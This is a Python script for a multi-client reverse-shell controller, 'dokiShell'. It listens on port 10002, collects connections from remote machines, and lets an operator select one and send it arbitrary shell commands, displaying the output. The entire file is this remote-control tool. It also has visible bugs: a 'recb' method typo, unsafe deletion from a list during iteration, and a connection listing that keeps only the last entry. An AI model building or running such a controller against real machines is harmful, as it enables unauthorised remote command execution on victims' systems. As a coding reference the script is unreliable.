import queue
import socket
import sys # commands and terminal
import threading
import time
from queue import Queue

NUMBER_OF_THREADS = 2
JOB_NUMBER = [1, 2]

queue = Queue()
all_connetions = []
all_adresses   = []


# connect two computers
def create_socket():
    try:
        global host
        global port
        global s
        host = "0.0.0.0"
        port = 10002

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    except socket.error as errmsg:
        print("socket creation errot: "+ str(errmsg))


# binding the socket and listening for connections
def bind_socket():
    try:
        global host
        global port
        global s

        # binding any connection that comes from the client
        print("Binding the port: "+ str(port)) 

        s.bind((host, port))
        s.listen(5)

    except socket.error as msg:
        print("Socket Binding error " + str(msg) +" retrying...")
        bind_socket()

        
# handeling connections from multiple clients and saveing the connections
def accepting_connections():
    # closeing previous connections when this script is restarted 
    for c in all_connetions:
        c.close()

    del all_connetions[:]
    del all_adresses[:]

    while True:
        try:
            conn, address = s.accept() # accepting the incoming connections 
            s.setblocking(1) # prevents timeout from happening 
            all_connetions.append(conn)
            all_adresses.append(address)
            print("Connection: " + address[0] + " has been established!")
        except:
            print("Error accepting connectins!")


# creating our own shell promt to controle the incoming connectisn 
def start_promt():
    print('Welcome to dokiShell, here we have only 3 commands!\n'+ 
        'First command: <list> \n\t with this command you can list all the connection you have\n'+
        'Second command: <select i> \n\t in this command you can chose one of the connections'+
        'and start sending commands via this connection\n'+
        'Third command: <exit> \n\t with this command you can exit the program\n')

    while True:
        cmd = input('dokiShell> ')

        if cmd == 'list': 
            list_connections()

        elif 'select' in cmd:
            conn = get_target(cmd)
            if conn is not None: 
                send_target_commands(conn)

        elif 'exit' in cmd: 
            sys.exit()

        else:
            print("Cannot recognize this command!\n")

            

# display all current active connections with the client 
def list_connections():
    results = ''

    for i, conn in enumerate(all_connetions) :
        try:
            conn.send(str.encode(' ')) # here we send an empty message to the client 
            conn.recb(20480)           # to recive a responce from the client
                                       # if we didn't get any responce we delete this connectin
        except:
            del all_connetions[i]
            del all_adresses[i]
            continue
        results = str(i) + "\t" + str(all_adresses[i][0]) + "\t" + str(all_adresses[i][1]) + "\n"

    print("#####clients#####" + "\n" + results)


# selecting the targec client and returning his connection
def get_target(cmd):
    try:
        target = int(cmd.replace('select ', '')) # getting the target number
        conn   = all_connetions[target]
        print("You are now connected to: " + str(all_adresses[target][0]))
        print(str(all_adresses[target][0]) + ">", end="") # end="" means that we are not going to 
                                                         # the next line otherwise the commands
                                                        # won't be working 
        return conn
    except:
        print("Selection is not valid!")
        return None


# Sendign command to the client computer
def send_target_commands(conn):
    while True:
        try:
            cmd = input()  
            if cmd == 'exit': break
            if len(str.encode(cmd)) > 0: # if we didn't press Enter
                conn.send(str.encode(cmd)) # sending the commands in a byte formate to the client computer
                client_response = str(conn.recv(1024), "utf-8") # after sending we will recive an input responce from 
                                    # the client computer so we will pring this respoce to see what is going on their
                print(client_response, end="")
        except:
            print("Errot sending command!")
            break 


# creating threads 
def create_workers():
    for _ in range(NUMBER_OF_THREADS):
        t = threading.Thread(target=work)
        t.daemon = True # if we didn't set this value the memory won't be cleared from the thread 
        t.start()
    

def work():
    while True:
        x = queue.get()
        if x == 1:
            create_socket()
            bind_socket()
            accepting_connections()
        if x == 2:
            start_promt()
        queue.task_done()

def create_jobs():
    for x in JOB_NUMBER: queue.put(x)
    queue.join()


create_workers()
create_jobs()
